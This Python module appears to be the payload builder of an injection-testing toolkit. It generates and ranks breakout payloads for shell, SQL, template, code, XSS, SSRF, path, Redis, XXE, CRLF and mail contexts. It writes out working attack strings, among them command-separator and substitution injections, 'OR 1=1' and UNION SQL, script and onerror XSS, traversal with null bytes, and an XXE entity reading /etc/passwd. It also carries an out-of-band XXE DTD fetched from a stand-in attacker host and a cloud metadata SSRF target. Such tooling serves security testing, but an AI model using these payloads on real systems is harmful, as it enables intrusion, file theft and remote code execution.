"""Payload builder: construct breakout payloads that achieve a goal.

The inverse of the analyzer. Given a template and a target (a shell command, SQL
expression, template probe, URL, file path, header, ...), generate candidate
breakout payloads, validate each with the analyzer, and return the one that
actually breaks out.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .code.context import analyze_code_context
from .crlf.context import analyze_crlf_context
from .dialects import (
    parse_code_lang,
    parse_crlf_kind,
    parse_dialect,
    parse_sql_dialect,
    parse_template_engine,
)
from .dispatch import analyze_lang
from .mail.context import analyze_mail_context
from .models import (
    AnalysisResult,
    CodeLang,
    Context,
    CrlfKind,
    Risk,
    SqlDialect,
    TemplateEngine,
)
from .mutation import _DIALECT_TOKENS
from .mutation import _closers as shell_closers
from .path.context import analyze_path_context
from .redis.context import analyze_redis_context
from .shell.breakout import render
from .shell.context import analyze_context
from .sql.context import analyze_sql_context
from .ssrf.context import analyze_ssrf_context
from .template.context import analyze_template_context
from .template.engines import COMMENT, EXPR, get_template_spec
from .xss.context import analyze_xss_context
from .xxe.context import analyze_xxe_context

BUILD_LANGS = (
    "shell",
    "sql",
    "template",
    "code",
    "xss",
    "ssrf",
    "path",
    "redis",
    "xxe",
    "crlf",
    "mail",
)

_DEFAULT_GOALS: dict[str, str] = {
    "shell": "id",
    "sql": "1=1",
    "template": "7*7",
    "code": "__import__('os').system('id')",
    "xss": "alert(1)",
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "path": "/etc/passwd",
    "redis": "CONFIG SET dir /tmp",
    "xxe": "file:///etc/passwd",
    "crlf": "Set-Cookie: injected=1",
    "mail": "Bcc: attacker@evil.example",
}

_SQL_TERMINATORS = ["-- ", "#", "/*", ""]
_CODE_QUOTES = {
    CodeLang.PYTHON: ["'", '"'],
    CodeLang.JAVASCRIPT: ["'", '"', "`"],
    CodeLang.PHP: ["'", '"'],
}

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class BuildResult:
    template: str
    lang: str
    dialect: str | None
    goal: str | None
    payload: str
    rendered: str
    validated: bool
    risk: str
    context: str
    strategy: str
    tried: int
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "lang": self.lang,
            "dialect": self.dialect,
            "goal": self.goal,
            "payload": self.payload,
            "rendered": self.rendered,
            "validated": self.validated,
            "risk": self.risk,
            "context": self.context,
            "strategy": self.strategy,
            "tried": self.tried,
            "notes": self.notes,
        }


def _breakout(lang: str, result: AnalysisResult) -> bool:
    b = result.breakout
    if lang == "code":
        return b.command_injected or b.substitution_injected
    if lang == "xss":
        return b.command_injected or "js-url" in b.separators
    if lang in ("crlf", "mail"):
        return b.command_injected or "encoded" in b.separators
    return b.command_injected


def _shell_candidates(template: str, goal: str, dialect) -> list[tuple[str, str]]:
    context = analyze_context(template, dialect)
    if context == Context.UNQUOTED:
        return [(f"; {goal} ; #", "unquoted")]

    separators, substitutions, terminators = _DIALECT_TOKENS[dialect]
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    for closer in shell_closers(context):
        for sep in separators:
            for term in terminators:
                add(f"{closer}{sep}{goal}{term}", "separator")
                add(f"{closer}{sep} {goal} {term}".rstrip(), "separator-spaced")
        for sub in substitutions:
            wrapped = sub.format(cmd=goal)
            for term in terminators:
                add(f"{closer}{wrapped}{term}", "substitution")

    return out


def _sql_bodies(goal: str) -> list[tuple[str, str]]:
    upper = goal.upper()
    if upper.startswith(("OR ", "AND ", "UNION ", ";")):
        return [(goal, "direct")]
    if " FROM " in upper:
        return [(f"UNION SELECT {goal}", "union-goal")]
    return [(f"OR {goal}", "or-goal"), ("OR 1=1", "boolean")]


def _sql_candidates(
    template: str, goal: str, dialect: SqlDialect
) -> list[tuple[str, str]]:
    context = analyze_sql_context(template, dialect)
    closers = (
        ["'", "')", ""]
        if context == Context.SQL_STRING
        else ['"', "`", ""]
        if context == Context.SQL_IDENTIFIER
        else [""]
    )
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    for closer in closers:
        for body, strategy in _sql_bodies(goal):
            for term in _SQL_TERMINATORS:
                sep = " " if closer and not closer.endswith(")") else ""
                add(f"{closer}{sep}{body}{term}".rstrip(), strategy)

    return out


def _template_candidates(
    template: str, goal: str, engine: TemplateEngine
) -> list[tuple[str, str]]:
    context = analyze_template_context(template, engine)
    spec = get_template_spec(engine)
    expr = next((r for r in spec.regions if r.kind == EXPR), None)
    comment = next((r for r in spec.regions if r.kind == COMMENT), None)
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload and payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    if context in (Context.TEMPLATE_EXPRESSION, Context.TEMPLATE_STATEMENT):
        add(goal, "direct-expression")
        return out

    if context == Context.TEMPLATE_STRING:
        for quote in ("'", '"'):
            add(f"{quote}+{goal}+{quote}", "close-string")
        return out

    if expr is None:
        return out

    if context == Context.TEMPLATE_COMMENT and comment:
        add(f"{comment.close}{expr.open} {goal} {expr.close}", "escape-comment")
        return out

    add(f"{expr.open} {goal} {expr.close}", "open-expression")
    add(f"{expr.open}{goal}{expr.close}", "open-expression")
    return out


def _code_candidates(template: str, goal: str, lang: CodeLang) -> list[tuple[str, str]]:
    context = analyze_code_context(template, lang)
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    if context == Context.CODE_STRING:
        for quote in _CODE_QUOTES[lang]:
            add(f"{quote}; {goal} #", "string-break")
            add(f"{quote} + {goal} + {quote}", "string-concat")
    elif context == Context.CODE_TEMPLATE:
        add(f"${{{goal}}}", "template-subst")
    else:
        add(goal, "direct")

    return out


def _xss_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_xss_context(template)
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    if context == Context.HTML_ATTR:
        add(f'"><script>{goal}</script>', "attr-break-quote")
        add(f"'><script>{goal}</script>", "attr-break-quote-single")
        add(f'" onmouseover="{goal}"', "attr-break-event")
        add(f"javascript:{goal}", "attr-break-js-url")
    elif context == Context.HTML_SCRIPT:
        add(f"</script><script>{goal}</script>", "script-break")
        add(f"';{goal};//", "js-string-break")
    elif context == Context.HTML_COMMENT:
        add(f"--><script>{goal}</script>", "comment-break")
    else:
        add(f"<script>{goal}</script>", "script-element")
        add(f'<img src=x onerror="{goal}">', "img-onerror")

    return out


def _ssrf_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_ssrf_context(template)
    if context == Context.SSRF_PATH:
        return [(goal, "path-value")]
    if context == Context.SSRF_HOST:
        return [
            (goal.split("://", 1)[-1].split("/", 1)[0], "host-value"),
            (goal, "host-raw"),
        ]
    return [(goal, "url-value")]


def _path_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_path_context(template)
    seen: set[str] = set()
    out: list[tuple[str, str]] = []

    def add(payload: str, strategy: str) -> None:
        if payload not in seen:
            seen.add(payload)
            out.append((payload, strategy))

    add(goal, "goal-direct")
    if context == Context.PATH_BASE and not goal.startswith("/"):
        add(f"../../../../{goal.lstrip('/')}", "traversal")
    if context == Context.PATH_EXT:
        add(f"../../../../{goal.lstrip('/')}%00", "traversal-nullbyte")

    return out


def _redis_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_redis_context(template)
    if context == Context.REDIS_INLINE:
        return [(goal, "inline")]
    return [(f"x\r\n{goal}\r\n", "argument-crlf")]


def _xxe_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_xxe_context(template)
    if context == Context.XXE_CONTENT:
        return [("&xxe;", "entity-ref")]
    decl = '<?xml version="1.0"?>'
    return [
        (
            decl + f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{goal}">]><r>&xxe;</r>',
            "file-read",
        ),
        (
            decl
            + '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://evil.example/x.dtd"> %ext;]>'
            + "<r/>",
            "oob-parameter",
        ),
    ]


def _crlf_candidates(template: str, goal: str, kind: CrlfKind) -> list[tuple[str, str]]:
    analyze_crlf_context(template, kind)
    return [
        (f"\r\n{goal}", "crlf"),
        (f"%0d%0a{goal}", "encoded-crlf"),
        (f"\n{goal}", "bare-lf"),
    ]


def _mail_candidates(template: str, goal: str) -> list[tuple[str, str]]:
    context = analyze_mail_context(template)
    header_goal = goal if goal.startswith(("Bcc:", "Cc:", "To:", "X-")) else goal
    if context == Context.SMTP_COMMAND:
        return [(f"\r\n{header_goal}", "smtp-smuggle")]
    if context == Context.MAIL_BODY:
        return [(f"\r\n.\r\n{header_goal}", "body-terminator")]
    return [
        (f"\r\n{header_goal}", "header-inject"),
        (f"%0d%0a{header_goal}", "encoded-header"),
    ]


def _candidate_generators(
    lang: str, template: str, goal: str, dialect: str | None
) -> list[tuple[str, str]]:
    if lang == "shell":
        return _shell_candidates(template, goal, parse_dialect(dialect or "posix"))
    if lang == "sql":
        return _sql_candidates(template, goal, parse_sql_dialect(dialect or "mysql"))
    if lang == "template":
        return _template_candidates(
            template, goal, parse_template_engine(dialect or "jinja2")
        )
    if lang == "code":
        return _code_candidates(template, goal, parse_code_lang(dialect or "python"))
    if lang == "xss":
        return _xss_candidates(template, goal)
    if lang == "ssrf":
        return _ssrf_candidates(template, goal)
    if lang == "path":
        return _path_candidates(template, goal)
    if lang == "redis":
        return _redis_candidates(template, goal)
    if lang == "xxe":
        return _xxe_candidates(template, goal)
    if lang == "crlf":
        return _crlf_candidates(template, goal, parse_crlf_kind(dialect or "header"))
    if lang == "mail":
        return _mail_candidates(template, goal)
    return []


def build(
    template: str,
    lang: str = "shell",
    goal: str | None = None,
    dialect: str | None = None,
) -> BuildResult:
    """Construct a breakout payload for ``template`` that achieves ``goal``."""
    lang = lang.strip().lower()
    if lang not in BUILD_LANGS:
        raise ValueError(
            "build supports: " + ", ".join(BUILD_LANGS) + f", not {lang!r}"
        )

    effective_goal = (goal or _DEFAULT_GOALS[lang]).strip()
    candidates = _candidate_generators(lang, template, effective_goal, dialect)

    best: AnalysisResult | None = None
    best_payload = ""
    best_strategy = ""
    validated = False

    for payload, strategy in candidates:
        result = analyze_lang(template, payload, lang, dialect)
        if _breakout(lang, result):
            if not validated or _RISK_ORDER[result.risk] > _RISK_ORDER[best.risk]:  # type: ignore[union-attr]
                best = result
                best_payload = payload
                best_strategy = strategy
                validated = True

    if best is None and candidates:
        payload, strategy = candidates[0]
        best = analyze_lang(template, payload, lang, dialect)
        best_payload = payload
        best_strategy = strategy

    assert best is not None
    notes = list(best.notes)
    if not validated:
        notes.insert(
            0, "No candidate achieved a confirmed breakout; returning best effort."
        )

    return BuildResult(
        template=template,
        lang=lang,
        dialect=dialect,
        goal=goal,
        payload=best_payload,
        rendered=render(template, best_payload),
        validated=validated,
        risk=best.risk.value,
        context=best.context.value,
        strategy=best_strategy,
        tried=len(candidates),
        notes=notes,
    )
